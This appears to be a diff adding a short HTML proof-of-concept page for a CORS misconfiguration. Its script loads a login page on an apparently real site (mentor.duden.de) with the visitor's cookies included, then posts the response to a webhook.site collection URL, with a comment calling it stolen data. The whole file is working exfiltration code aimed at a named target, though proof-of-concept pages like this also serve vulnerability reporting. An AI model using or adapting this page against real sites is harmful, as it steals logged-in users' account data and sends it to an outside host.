@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC Logger</title>
+</head>
+<body>
+  <h1>CORS Misconfiguration PoC</h1>
+  <script>
+    fetch("https://mentor.duden.de/user/login_299792458", {
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Send stolen data to your webhook
+      fetch("https://webhook.site/012969b8-6fe1-4709-bb42-b2d8868cdc81", {
+        method: "POST",
+        mode: "no-cors",
+        body: data
+      });
+    })
+    .catch(err => console.error("Error:", err));
+  </script>
+</body>
+</html>
